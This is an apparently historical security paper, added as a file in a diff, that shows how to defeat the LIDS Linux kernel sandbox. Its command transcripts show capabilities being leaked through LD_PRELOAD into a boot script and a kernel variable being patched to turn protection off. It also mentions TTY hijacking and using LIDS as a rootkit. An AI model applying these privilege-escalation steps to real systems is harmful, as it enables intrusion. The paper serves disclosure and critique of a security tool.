@@ -1,0 +1,246 @@
+
+|=-------------=[ Last Intruder Disabled System -- LIDS ]=---------------=|
+|=-----------------------------------------------------------------------=|
+|=----------------=[ stealth <stealth@segfault.net>  ]=------------------=|
+
+
+
+--[ Introduction
+
+
+LIDS was developed to protect systems from malicious root's which may
+creep in via various system-holes such as bugs in wu-ftpd etc. In the
+absence of "real protection" the LIDS developers felt that they need to
+create some sort of sandbox in a way that evil attackers who gained root
+access to the host may not be able to replace important systemfiles
+such as /bin/login. They should also not be able to kill important
+processes such as httpd or to modify the systemlogs.
+    I will show step by step that LIDS not even just fails to protect
+the system from attackers but also is a securityhole in itself which
+allows users to gain root-access in certain configurations. Further LIDS
+may be abused as a rootkit for hiding files or processes.
+
+
+--[ 1. How to determine you are LIDS'ed
+
+
+Lets assume that we already gained root on our testbox. This is not
+very difficult as a lot of local root holes exist in almost all Linux
+distributions. Choose one of the kernelbugs, crontab, modprobe or
+sperl :-). LIDS will not hinder users to gain uid 0. LIDS was only
+designed to put restrictions to user with uid 0 (root).
+
+linux:~ # ls -la /proc/sys/lids/locks
+-rw-------    1 root     root            0 Dec 31 21:22 /proc/sys/lids/locks
+linux:~ # touch /sbin/x
+touch: creating `/sbin/x': Operation not permitted
+linux:~ #
+
+Ok. This is easy. The system is LIDSed. Obviously the administrator
+put a READONLY rule to /sbin directory.
+
+Finding out which configuration the LIDS box has is already the
+hardest part. We may do that with bruteforce. I wrote a tool
+called "capscan" which tells you which restrictions apply to you.
+
+
+--[ What did they do with root?
+
+
+ linux:~ # cd /tmp/lids/
+ linux:/tmp/lids # ./capscan -b
+ b 0 CAP_CHOWN
+ b 5 CAP_KILL
+ b 6 CAP_SETGID
+ b 7 CAP_SETUID
+ b 23 CAP_SYS_NICE
+ b 27 CAP_MKNOD
+ linux:/tmp/lids #
+
+
+Aha. Capscan bruted the most important capabilities for us. We need to
+brute-force (i.e. try chown(), try create_module(), try chroot(), ...)
+because LIDS does not use the Linux kernel's capability-bits inside the
+task-struct so we cant obtain it via capget().
+
+To better understand which restrictions are placed on the system, we will
+have a look at the configuration:
+
+linux:~ # lidsconf -L
+LIST
+                Subject   ACCESS(inherit)        time        Object
+-----------------------------------------------------
+        Any file  READONLY(domain):  0  0000-0000                  /etc
+        Any file  READONLY(domain):  0  0000-0000                 /sbin
+        Any file  READONLY(domain):  0  0000-0000                  /bin
+        Any file  READONLY(domain):  0  0000-0000                  /usr
+        Any file  READONLY(domain):  0  0000-0000                  /lib
+        Any file      DENY(domain):  0  0000-0000             /etc/lids
+        Any file      DENY(domain):  0  0000-0000           /etc/shadow
+        Any file    APPEND(domain):  0  0000-0000              /var/log
+      /bin/login  READONLY(domain):  0  0000-0000           /etc/shadow
+         /bin/su  READONLY(domain):  0  0000-0000           /etc/shadow
+/etc/init.d/halt     GRANT(domain):1000  0000-0000         CAP_SYS_ADMIN
+  /etc/init.d/rc     GRANT(domain):1000  0000-0000         CAP_SYS_ADMIN
+  /etc/init.d/rc     GRANT(domain):1000  0000-0000         CAP_NET_ADMIN
+/etc/init.d/halt     GRANT(domain):1000  0000-0000         CAP_NET_ADMIN
+/etc/init.d/halt     GRANT(domain):1000  0000-0000         CAP_SYS_RAWIO
+/etc/init.d/halt     GRANT(domain):1000  0000-0000         CAP_INIT_KILL
+  /etc/init.d/rc     GRANT(domain):1000  0000-0000         CAP_INIT_KILL
+      /bin/login     GRANT(domain):  0  0000-0000         CAP_SYS_ADMIN
+      /bin/login     GRANT(domain):  0  0000-0000         CAP_NET_ADMIN
+        Any file  READONLY(domain):  0  0000-0000                 /boot
+
+
+The attacker is not able to issue the "lidsconf -L" command. This
+command was issued from a LIDS free session, which root may be enter
+by giving the correct password. Attacker does not know the password, so
+we have to look for some other way.
+Almost all systems will have CAP_SYS_ADMIN placed to the bootup and the
+shutdown scripts or otherwise you won't be able to mount your disk etc.
+CAP_NET_ADMIN is needed too to configure your network as well as
+CAP_SYS_RAWIO is needed by some programs. I took this config more or less
+from the examples shipped with LIDS. As you see, apropriate system directo-
+ries are protected etc etc. For our reasons it does not matter which
+directories we can modify or not, so do not get stuck at this.
+The inherit level tells LIDS how much fork()'s within the program are
+allowed and still have the same capability granted. /etc/init.d/rc
+for example is a shellscript and forks off a lot of commands such
+as 'ifconfig' etc. and thus it needs to have a certain inheritance level.
+Usually you'd use -1 (-1 means unlimited inheritance) here, but I never
+got it working with -1 (bug?) and so I used 1000.
+
+ 
+--[ Gimme your CAPs, please!
+
+
+The following seems really trivial but LIDS is just leaking capabilities
+bound to certain programs such as for /etc/initd/halt in this example.
+"x" shellscript will create a shared object /tmp/boom.so which forks a
+shell. Nothing special. When executing /etc/init.d/halt script we preload
+this shared object and obtain the shell from it. Lets go...
+
+ linux:/tmp/lids # ./x
+ OK
+ linux:/tmp/lids # LD_PRELOAD=/tmp/boom.so /etc/init.d/halt
+ linux:/tmp/lids # ./capscan -b
+ b 0 CAP_CHOWN
+ b 5 CAP_KILL
+ b 6 CAP_SETGID
+ b 7 CAP_SETUID
+ b 12 CAP_NET_ADMIN
+ b 17 CAP_SYS_RAWIO
+ b 21 CAP_SYS_ADMIN
+ b 23 CAP_SYS_NICE
+ b 27 CAP_MKNOD
+ linux:/tmp/lids #
+
+
+We obtained CAP_SYS_ADMIN, CAP_SYS_RAWIO and CAP_NET_ADMIN from the halt
+script. It could not be easier. This will also work with setuid capability
+granted to xinetd for example. Users may gain root with the help of LIDS!!!
+The inherit-level does not come to play here, even 0 would work fine for
+giving users a rootshell.
+
+Let me conclude what happened until here: the capabilities such as
+CAP_SYS_RAWIO are leaking ("inherited") to any subprocess if apropriate
+inherit level was placed on the file. We may gain these capabilities via
+preloading shared objects or by setting the $PATH variable if the file is
+actually a shellscript. Even if the inherit-level is 0, i.e. the capability
+is not inherited across fork() the LD_PRELOAD trick still works. That is
+because preloading does not create subprocesses and inside our preloaded
+library we may call setuid(0) if CAP_SETUID was granted. The executed shell
+will then be a rootshell.
+
+LIDS however is still in kernel and protects /sbin and other directories
+from tampering. So lets continue:
+
+ linux:/tmp/lids # cc lidsoff.c -o l
+ linux:/tmp/lids # grep lids /proc/ksyms
+ c02a2120 lids_load_Ra57ab5ad
+ c0120a10 lids_cap_log_R0d747633
+ c011e088 lids_cap_time_checker_R9f27daab
+ c02a2124 lids_local_on_R641824fe
+ c02a212c lids_local_pid_R2a2dd337
+ c011dfb0 lids_local_off_R445f75c1
+ linux:/tmp/lids # touch /sbin/x
+ touch: creating `/sbin/x': Operation not permitted
+ linux:/tmp/lids # ls -la /etc/lids
+ ls: /etc/lids: No such file or directory
+ linux:/tmp/lids # ./l
+ Usage: ./l <addr-of-lids_local_on-in-hex>
+
+ linux:/data5/cvs-work/lids # ./l c02a2124
+ # Patching [c02a2120]
+ 1 -> 0
+ disabled global LIDS protection
+
+ linux:/tmp/lids # ls -la /etc/lids
+ total 32 
+ drwxr-xr-x    2 root     root         4096 Dec 31 15:23 .
+ drwxr-xr-x   52 root     root         8192 Dec 31 19:12 ..
+ -rw-r--r--    1 root     root         6760 Dec 30 21:11 lids.cap
+ -rw-r--r--    1 root     root          987 Dec 31 15:48 lids.conf
+ -rw-r--r--    1 root     root          970 Dec 30 21:11 lids.net
+ -rw-r--r--    1 root     root           40 Dec 30 21:23 lids.pw
+ linux:/tmp/lids # touch /sbin/x
+ linux:/tmp/lids # ./capscan -b
+ b 0 CAP_CHOWN
+ b 5 CAP_KILL
+ b 6 CAP_SETGID
+ b 7 CAP_SETUID
+ b 10 CAP_NET_BIND_SERVICE
+ b 12 CAP_NET_ADMIN
+ b 16 CAP_SYS_MODULE
+ b 17 CAP_SYS_RAWIO
+ b 18 CAP_SYS_CHROOT
+ b 19 CAP_SYS_PTRACE
+ b 21 CAP_SYS_ADMIN
+ b 23 CAP_SYS_NICE
+ b 27 CAP_MKNOD
+ linux:/tmp/lids #
+
+"lidsoff" is just patching the "lids_load" variable in kernel to 0.
+LIDS won't check any actions anymore then. This is possible because
+/etc/init.d/halt was leaking the CAP_SYS_RAWIO capability to us.
+Capscan shows that we got all important capabilities (capscan does
+not try some capabilities such as CAP_SYS_REBOOT etc. :-)
+We are done! The "1 -> 0" tells you that LIDS is disabled.
+
+
+--[ Discussion
+
+You may be surprised how easy it was to disable LIDS. There are other ways
+to do it. One may hijack a LIDS free session by using a simple TTY
+hijacker. Commands may easily be inserted into administrators terminal.
+I don't like the idea of sandboxing root, there is too much that may
+be overlooked and which is not fixable that easy. One thing is that
+they still share the same homedir. Even though if you can make it readonly,
+i don't feel comfortable with it.
+Rather I like systems with ACL's which may be applied to files and a
+capability system where root is still root but programs such as "passwd"
+or "ssh" don't have setuid root but apropriate capabilities. SELinux is
+way more better approach for this, even if I hope that .gov extensions
+will never make it into the Linux kernel.
+Putting a portscan detector into the Linux kernel is probably also a bad
+idea. As less code as possible in critical parts of the system!
+    Once an attacker broke your LIDS system, he does not even need to
+install a rootkit, LIDS is one. It allows for hiding files and processes and
+once the attacker changed the LIDS password, the administrator lost his
+machine.
+ 
+
+--[ Links
+
+[LIDS] http://www.lids.org
+LIDS system, FAQs and documentation to LIDS.
+I tried version lids-1.1.0pre6-2.4.14.
+
+[capscan] http://stealth.7350.org/lids-hack.tgz 
+This paper with programs described inhere.
+
+[SELinux] http://www.nsa.gov/selinux
+SEcure Linux. One more toy to play with at home.
+
+
+
